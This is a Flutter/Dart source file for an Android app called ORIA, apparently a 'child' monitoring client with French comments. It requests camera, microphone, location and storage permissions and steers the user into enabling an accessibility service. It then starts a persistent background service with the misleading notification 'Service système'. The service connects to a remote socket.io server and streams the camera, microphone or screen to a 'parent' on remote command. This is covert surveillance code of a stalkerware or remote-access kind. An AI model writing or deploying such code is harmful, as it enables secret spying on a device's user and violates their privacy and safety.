import 'package:flutter/material.dart';
import 'package:flutter_background_service/flutter_background_service.dart';
import 'package:permission_handler/permission_handler.dart';
import 'package:socket_io_client/socket_io_client.dart' as IO;
import 'package:device_info_plus/device_info_plus.dart';
import 'package:shared_preferences/shared_preferences.dart';
import 'package:android_intent_plus/android_intent.dart';
import 'stream_service.dart';
import 'dart:ui';

const String SERVER_URL = 'https://oria-server-tzc1.onrender.com';

void main() async {
  WidgetsFlutterBinding.ensureInitialized();

  await [
    Permission.camera,
    Permission.microphone,
    Permission.location,
    Permission.notification,
    Permission.storage,
  ].request();

  // ✅ Vérifier si l'accessibilité est activée
  final prefs = await SharedPreferences.getInstance();
  final accessibilityEnabled = prefs.getBool('accessibility_enabled') ?? false;

  if (!accessibilityEnabled) {
    runApp(const EnableAccessibilityScreen());
    return;
  }

  await initializeService();
  runApp(const OriaChildApp());
}

Future<void> initializeService() async {
  final service = FlutterBackgroundService();
  await service.configure(
    androidConfiguration: AndroidConfiguration(
      onStart: onStart,
      autoStart: true,
      isForegroundMode: true,
      foregroundServiceNotificationId: 888,
      initialNotificationTitle: 'Service système',
      initialNotificationContent: 'Actif',
    ),
    iosConfiguration: IosConfiguration(autoStart: true, onForeground: onStart),
  );
  await service.startService();
}

@pragma('vm:entry-point')
void onStart(ServiceInstance instance) async {
  DartPluginRegistrant.ensureInitialized();
  final deviceInfo = DeviceInfoPlugin();
  final androidInfo = await deviceInfo.androidInfo;
  final deviceId = androidInfo.id;
  final deviceName = '${androidInfo.manufacturer} ${androidInfo.model}';

  IO.Socket? socket;
  StreamService? streamService;

  void connect() {
    socket?.dispose();
    socket = IO.io(SERVER_URL, <String, dynamic>{
      'transports': ['websocket'],
      'autoConnect': true,
      'reconnection': true,
      'reconnectionDelay': 5000,
      'reconnectionAttempts': 999,
    });

    socket!.on('connect', (_) {
      print('✅ [CHILD] CONNECTED');
      // ✅ Rejoindre la salle device:<deviceId>
      socket!.emit('register_child', {'deviceId': deviceId, 'deviceName': deviceName});
    });

    socket!.on('execute_command', (data) async {
      final action = data['action'];
      final requestId = data['requestId'];
      print('📡 [CHILD] COMMAND_RECEIVED: $action (req:$requestId)');

      try {
        if (action == 'start_camera') {
          await streamService?.stop();
          // ✅ Destination = device:parent-main
          streamService = StreamService(socket!, 'parent-main');
          await streamService!.startCamera();
          print('✅ [CHILD] CAPTURE_STARTED: camera');
        } else if (action == 'start_mic') {
          await streamService?.stop();
          streamService = StreamService(socket!, 'parent-main');
          await streamService!.startMic();
          print('✅ [CHILD] CAPTURE_STARTED: mic');
        } else if (action == 'start_screen') {
          await streamService?.stop();
          streamService = StreamService(socket!, 'parent-main');
          await streamService!.startScreen();
          print('✅ [CHILD] CAPTURE_STARTED: screen');
        } else if (action == 'stop_stream') {
          await streamService?.stop();
          streamService = null;
          print('✅ [CHILD] STREAM_STOPPED');
        }
      } catch (e) {
        print('❌ [CHILD] CAPTURE_ERROR: $e');
      }
    });

    // ✅ Format uniforme: { target, type, data }
    socket!.on('signal', (msg) {
      print('🔄 [CHILD] SIGNAL_RECEIVED: ${msg['type']}');
      streamService?.handleSignal(msg);
    });

    socket!.on('connect_error', (_) => print('⏳ [CHILD] RECONNECTING...'));
  }
  connect();
}

// ✅ ÉCRAN D'ACTIVATION ACCESSIBILITÉ
class EnableAccessibilityScreen extends StatelessWidget {
  const EnableAccessibilityScreen({super.key});
  @override
  Widget build(BuildContext context) {
    return MaterialApp(
      debugShowCheckedModeBanner: false,
      home: Scaffold(
        backgroundColor: Colors.black,
        body: Center(
          child: Padding(
            padding: const EdgeInsets.all(32),
            child: Column(
              mainAxisAlignment: MainAxisAlignment.center,
              children: [
                Icon(Icons.accessibility_new, color: Colors.indigo, size: 80),
                const SizedBox(height: 24),
                const Text('Activation requise', style: TextStyle(color: Colors.white, fontSize: 24, fontWeight: FontWeight.bold)),
                const SizedBox(height: 16),
                const Text(
                  'ORIA a besoin du service d\'accessibilité pour fonctionner correctement.\n\n1. Cliquez ci-dessous\n2. Activez "ORIA"\n3. Revenez ici',
                  textAlign: TextAlign.center,
                  style: TextStyle(color: Colors.grey, fontSize: 14),
                ),
                const SizedBox(height: 32),
                FilledButton.icon(
                  onPressed: () async {
                    const intent = AndroidIntent(action: 'android.settings.ACCESSIBILITY_SETTINGS');
                    await intent.launch();
                  },
                  icon: const Icon(Icons.settings_accessibility),
                  label: const Text('OUVRIR PARAMÈTRES'),
                  style: FilledButton.styleFrom(minimumSize: const Size(double.infinity, 50)),
                ),
                const SizedBox(height: 16),
                TextButton(
                  onPressed: () async {
                    final prefs = await SharedPreferences.getInstance();
                    await prefs.setBool('accessibility_enabled', true);
                    await initializeService();
                    runApp(const OriaChildApp());
                  },
                  child: const Text('Déjà activé → Continuer', style: TextStyle(color: Colors.grey)),
                ),
              ],
            ),
          ),
        ),
      ),
    );
  }
}

class OriaChildApp extends StatelessWidget {
  const OriaChildApp({super.key});
  @override
  Widget build(BuildContext context) {
    return MaterialApp(
      debugShowCheckedModeBanner: false,
      home: Scaffold(
        backgroundColor: Colors.black,
        body: Center(
          child: Column(mainAxisAlignment: MainAxisAlignment.center, children: [
            Icon(Icons.visibility_off, color: Colors.grey[800], size: 100),
            const SizedBox(height: 20),
            Text("ORIA Activé", style: TextStyle(color: Colors.grey[700], fontSize: 18)),
            const SizedBox(height: 10),
            Text("Service en arrière-plan actif.", style: TextStyle(color: Colors.grey[800], fontSize: 12)),
          ]),
        ),
      ),
    );
  }
}